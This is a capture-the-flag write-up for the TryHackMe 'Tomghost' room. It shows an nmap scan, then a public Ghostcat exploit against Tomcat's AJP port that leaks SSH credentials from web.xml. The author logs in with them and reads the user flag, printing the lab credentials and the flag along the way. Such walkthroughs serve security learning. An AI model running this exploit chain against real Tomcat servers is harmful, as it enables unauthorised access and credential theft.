# Tomghost

Starting with basic recon:
```sh
nmap -sV $ip -p-
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-15 08:19 CEST
Nmap scan report for 10.10.46.67
Host is up (0.078s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We got a few services running but I can instantly see an application running on Port `8080` named Tomcat. <br/>
So I would just make a quick browser search for known exploits. <br/>

![grafik](https://github.com/Aryt3/writeups/assets/110562298/8f316966-b846-4017-a809-1160fd813237)

this leads me to https://www.exploit-db.com/exploits/48143. <br/>
Using the exploit:
```sh
python2 exploit.py 10.10.46.67 -p 8009 -f WEB-INF/web.xml
Getting resource at ajp13://10.10.46.67:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

After successfully retrieving user creds I try to login:
```sh
ssh skyfuck@$ip       
The authenticity of host '10.10.46.67 (10.10.46.67)' can't be established.
ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.46.67' (ED25519) to the list of known hosts.
skyfuck@10.10.46.67's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ whoami
skyfuck
```

Taking a look around:
```sh
skyfuck@ubuntu:~$ pwd
/home/skyfuck
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```

After taking a closer look at those files I want to look around further.
```sh
skyfuck@ubuntu:~$ ls /home/
merlin  skyfuck
skyfuck@ubuntu:~$ ls /home/merlin
user.txt
skyfuck@ubuntu:~$ cat /home/merlin/user.txt
THM{GhostCat_1s_so_cr4sy}
```

Seems like we got our first flag.


